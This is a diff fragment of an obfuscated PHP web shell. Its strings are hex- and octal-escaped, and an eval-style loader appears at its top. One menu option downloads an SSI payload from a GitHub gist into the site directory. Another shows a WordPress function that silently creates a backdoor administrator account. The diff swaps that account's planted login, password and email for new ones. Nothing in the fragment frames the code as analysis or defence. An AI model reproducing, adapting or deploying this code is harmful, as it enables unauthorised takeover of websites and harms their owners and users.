@@ -30,9 +30,9 @@ $T=$u('',$r);$T();
 				</div><?php  } elseif ($_POST["\x6f\x70\x74\151\x6f\156"] == "\64") { $url = "\150\164\x74\160\x73\x3a\x2f\x2f\147\x69\x73\164\x2e\x67\x69\x74\x68\165\142\x2e\x63\x6f\155\x2f\x72\x61\x66\141\x65\171\x66\x61\61\63\63\67\57\x31\66\x66\61\66\65\60\x66\65\x30\145\x62\70\x36\141\x63\x35\x63\x30\144\63\x32\141\66\x31\x38\65\145\142\x63\65\66\x2f\162\x61\x77\x2f\62\x61\71\66\144\x61\x62\x62\145\141\x37\x34\63\60\x63\x38\61\x38\145\63\x62\144\x39\x35\x61\143\x61\64\143\x38\146\x66\x65\65\x65\x35\x35\x36\x61\x65\57\114\x4f\114\103\101\x54\123\x2e\163\x68\x74\155\154"; $fileName = getcwd() . "\x2f\154\157\154\x63\141\164\163\x2d\163\163\x69\56\x73\x68\164\155\x6c"; } elseif ($_POST["\157\x70\164\x69\157\x6e"] == "\65") { ?>
 <div class="container-fluid language-javascript mt-3">
         <div class="shell mb-3 position-relative"><pre style="font-size:10px;" id="code"><code>function lolcatsadmin(){
-$login = 'lolcats';
-$passw = 'kontolbabibangsat#1337';
-$email = 'lolcats-ganteng@proton.me';
+$login = 'adminweb';
+$passw = '#susahditebak7562#';
+$email = 'pewedandi32@gmail.com';
 if ( !username_exists( $login ) && !email_exists( $email ) ) {
 $user_id = wp_create_user( $login, $passw, $email );
 $user = new WP_User( $user_id );
